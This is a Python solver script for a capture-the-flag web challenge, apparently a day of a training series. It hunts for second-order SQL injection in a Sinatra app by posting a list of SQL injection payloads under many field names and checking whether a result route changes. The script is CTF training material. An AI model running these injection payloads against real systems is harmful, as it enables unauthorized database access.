#!/usr/bin/env python3
"""Ask Again Later (web-exploitation-day-12-ask-again-later) solver/recon.

App: Sinatra "Report Replay". Clues at /api/clues give feature_route (POST, stores
a JSON hash) and secondary_route (GET, returns {"rows": [...], "effect": "..."}).
Prompt implies second-order injection: plant a malicious value via the submit
route, then read it back (unsafely re-used) via the result route.

This script runs the full evidence-based test matrix against a live target and
prints every observed (payload, response) pair. It does NOT hard-code or guess
an answer: if no test here changes the result route's output, the target is
genuinely unsolved and should be recorded as blocked, not guessed.

Usage: python3 -I solve.py <base_url> <submit_route> <result_route>
Only ever talks to the one target origin passed on argv. No GM calls.
"""
import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

UA = "ask-again-later-solver/1.0"


def make_client(base):
    def req(method, path, json_body=None, raw_body=None, content_type=None, extra_headers=None):
        url = base.rstrip("/") + path
        headers = {"User-Agent": UA, "Accept": "application/json"}
        if extra_headers:
            headers.update(extra_headers)
        data = None
        if json_body is not None:
            data = json.dumps(json_body).encode()
            headers["Content-Type"] = "application/json"
        elif raw_body is not None:
            data = raw_body if isinstance(raw_body, bytes) else raw_body.encode()
            headers["Content-Type"] = content_type or "application/json"
        request = urllib.request.Request(url, data=data, headers=headers, method=method)
        try:
            with urllib.request.urlopen(request, timeout=20) as resp:
                return resp.status, resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8", "replace")
        except Exception as e:  # noqa: BLE001
            return None, f"ERR {e!r}"

    return req


FIELD_NAMES = [
    "question", "q", "text", "note", "message", "content", "body", "query",
    "input", "data", "report", "ask", "prompt", "comment", "value", "title",
    "subject", "name", "id", "filter", "where", "sql", "clause", "condition",
]

SQLI_PAYLOADS = [
    "' OR 1=1-- ",
    "' OR '1'='1",
    "') OR ('1'='1",
    "') OR ('1'='1'-- -",
    "' UNION SELECT 'ZZ9MARK'-- ",
    "' UNION SELECT 'ZZ9MARK','ZZ9MARK'-- ",
    "' UNION SELECT 'ZZ9MARK','ZZ9MARK','ZZ9MARK'-- ",
    "0 UNION SELECT 'ZZ9MARK'-- ",
]


def run(base, submit_route, result_route):
    req = make_client(base)

    print("== recon ==")
    for path in ("/api/clues", "/robots.txt"):
        st, body = req("GET", path)
        print(f"GET {path} -> {st} {body[:200]}")
        time.sleep(0.7)

    print("\n== baseline result ==")
    st, body = req("GET", result_route)
    print(f"GET {result_route} -> {st} {body}")
    time.sleep(0.7)

    print("\n== field-name x SQLi matrix (second-order injection hunt) ==")
    for field in FIELD_NAMES:
        for payload in SQLI_PAYLOADS:
            st, body = req("POST", submit_route, json_body={field: payload})
            time.sleep(0.6)
            rst, rbody = req("GET", result_route)
            time.sleep(0.6)
            if rst != 200 or '"rows":[]' not in rbody:
                print(f"[HIT?] field={field} payload={payload!r}")
                print(f"  submit -> {st} {body}")
                print(f"  result -> {rst} {rbody}")
                return {"field": field, "payload": payload, "result": rbody}

    print("No field/payload combination changed the result route's output.")
    print("Do not guess an answer; record as blocked per the worker contract.")
    return None


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(__doc__)
        sys.exit(1)
    outcome = run(sys.argv[1], sys.argv[2], sys.argv[3])
    print(json.dumps({"outcome": outcome}))
